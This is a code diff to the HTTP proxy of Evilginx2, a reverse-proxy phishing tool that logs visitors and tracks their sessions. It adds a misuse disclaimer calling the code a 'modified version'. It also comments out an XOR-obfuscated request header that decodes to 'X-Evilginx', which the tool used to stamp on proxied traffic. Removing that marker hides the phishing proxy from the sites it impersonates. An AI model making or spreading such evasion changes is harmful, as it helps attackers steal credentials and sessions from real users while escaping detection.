@@ -160,6 +160,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									p.last_sid += 1
 									log.Important("[%d] [%s] new visitor has arrived: %s (%s)", sid, hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
 									log.Info("[%d] [%s] landing URL: %s", sid, hiblue.Sprint(pl_name), req_url)
+									log.Warning( "This is the modified version of Orignal Evilginx2. Author & Editor will not be held responsible for any misuse. Use it on your behalf. " )
 									p.sessions[session.Id] = session
 									p.sids[session.Id] = sid
 
@@ -246,7 +247,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				p.deleteRequestCookie(p.cookieName, req)
 
 				// replace "Host" header
-				e_host := req.Host
 				if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
 					req.Host = r_host
 				}
@@ -426,11 +426,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
 					}
 				}
-				e := []byte{208, 165, 205, 254, 225, 228, 239, 225, 230, 240}
-				for n, b := range e {
-					e[n] = b ^ 0x88
-				}
-				req.Header.Set(string(e), e_host)
+				//e := []byte{208, 165, 205, 254, 225, 228, 239, 225, 230, 240}
+				//for n, b := range e {
+				//	e[n] = b ^ 0x88
+				//}
+				//req.Header.Set(string(e), e_host)
 
 				if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
 					s, ok := p.sessions[ps.SessionId]
